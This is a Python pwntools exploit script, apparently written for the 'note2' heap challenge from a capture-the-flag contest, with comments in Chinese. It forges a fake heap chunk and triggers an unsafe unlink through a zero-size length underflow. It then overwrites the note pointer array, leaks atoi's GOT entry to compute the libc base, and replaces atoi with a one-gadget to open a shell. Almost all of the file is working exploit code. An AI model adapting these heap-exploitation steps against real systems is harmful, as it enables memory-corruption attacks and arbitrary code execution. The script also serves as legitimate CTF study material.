#!/usr/bin/python3
# coding=utf-8
# __author__:TaQini

from pwn import *
import socket
import sys
import re

local_file = './note2'
local_libc = 'libc-2.23.so'
remote_libc = local_libc  # '../libc.so.6'

is_local = False
is_remote = False
is_argv = True  # 是否带参运行
# data_final= #参数

if len(sys.argv) == 1:
    is_local = True
    p = process("./note2", env={"LD_PRELOAD": "./libc-2.23.so"})
    libc = ELF(local_libc)
    elf = ELF(local_file)
elif len(sys.argv) > 1:
    is_remote = True
    if sys.argv[1] == 'ssh':
        username, host = sys.argv[2].split('@')
        port = int(sys.argv[3])
        password = sys.argv[4]
        sh = ssh(username, host, port, password)
        if is_argv == True:
            p = sh.process(argv=[local_file, '24', '/dev/stdin'])
        else:
            p = sh.process(local_file)
        # elf = ELF(local_file)
    elif sys.argv[1] == 'nc':
        conn = remote(sys.argv[2], sys.argv[3])
    elif sys.argv[1] == 'local':
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("pwnable.kr", 9007))
    else:
        # len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
        p = remote(host, port)
        libc = ELF(remote_libc)

    '''else:
        host, port = sys.argv[1].split(':')'''


# elf = ELF(local_file)

context.log_level = 'debug'
chunk_index=0 # < 4
# context.arch = elf.arch


def se(data): return p.send(data)
def sa(delim, data): return p.sendafter(delim, data)
def sl(data): return p.sendline(data)


def sla(delim, data): return p.sendlineafter(delim, data)
def sea(delim, data): return p.sendafter(delim, data)
def rc(numb=4096): return p.recv(numb)
def ru(delims, drop=True): return p.recvuntil(delims, drop)
def uu32(data): return u32(data.ljust(4, '\0'))
def uu64(data): return u64(data.ljust(8, '\0'))
def info_addr(tag, addr): return p.info(tag + ': {:#x}'.format(addr))


'''def debug(cmd=''):
    if is_local:
        attach(p, cmd)'''


# info
def malloc(size,data):
    p.recvuntil("option--->>")
    p.sendline("1")
    p.recvuntil("Input the length of the note content:(less than 128)")
    # p.recvuntil("Size: ")
    p.sendline(str(size))
    ru("Input the note content:")
    sl(data)
    #print(p.recvuntil("note add success, the id is %d\n" % ind))


# 索引值从1开始


def readdata(idx, data):
    ru("option--->>")
    p.sendline('3')
    p.recvuntil("Input the id of the note:")
    p.sendline(str(idx))
    p.recvuntil("[1.overwrite/2.append]")
    p.sendline("1")
    p.recvuntil("TheNewContents:")
    p.sendline(data)
    # p.recvuntil("Content: ")
    print(p.recvuntil("Edit note success!"))


def free(idx):
    p.recvuntil("option--->>")
    p.sendline('4')
    p.recvuntil("Input the id of the note:")
    p.sendline(str(idx))


def dump(idx):
    p.recvuntil("option--->>")
    p.sendline('2')
    p.recvuntil("Input the id of the note:")
    p.sendline(str(idx))
    print (p.recvuntil("Content is "))
    leak = p.recvline().strip(b"\x0a") #\n
    leak = u64(leak + b"\x00"*(8-len(leak)))
    print( hex(leak))
    # print "men"
    #print( p.recvuntil("OK\n"))
    return leak

# rop1s
p.recvuntil("name:")

sl("fin")
ru("Input your address:")
sl("senty")


# 0x602120 开始保存着分配的chunk地址
ptr=0x602120 #需要的是第四块

payload=b''
payload+=p64(0x0)
payload+=p64(0xa0) 

payload+=p64(ptr-0x8*3)
payload+=p64(ptr-0x8*2)
payload+=p64(0x0)*int(((0x80-0x20)/8)) #填满这一块

#payload+=p64(0x80) #溢出到下一个块
#payload+=p64(0x90)


malloc(0x80,payload) #在这个块构建 fake chunk


malloc(0x00,"1"*0x8) #size为0x00,同样分配了空间 size=0x20

malloc(0x80,"1"*0x79) #如果是发送 0x80,就会溢出到 下一个选项

free(1)

malloc(0x00,b"5"*0x10+p64(0xa0)+p64(0x90)) #重新分配 idx为4，但chunk是原来释放掉的chunk
#溢出，size=0 -1 = -1=0xffffffff，比较是无符号数比较，所以溢出

free(2) #判断哪里是前一个块，单纯是看 prev_size 值，加上这个值的地址就是 前一个块起始地址
# 2.26后，释放会进tcache，不成功,除非分配>0x410

#P->fd (0x602120 - 0x18 = 0x602108) to 0x602120 利用这个指针 来覆盖所在的 指针数组
readdata(0,b"6"*24 + p64(elf.got['atoi'])) #其值为 atoi 地址

leak = dump(0)
libcBase = leak - libc.symbols['atoi']
oneShot = libcBase + 0xf02a4

print ("libc base: " + hex(libcBase))
print ("oneshot gadget: " + hex(oneShot))

readdata(0,p64(oneShot)) #替换atoi的got值
#gdb.attach(p,"source ~/.gdbinit-gef.py")

sl("1") #调用atoi, 执行onegadget


p.interactive()

# print(conn.recvlines())

# debug()


# system()地址 + 命令字符串地址
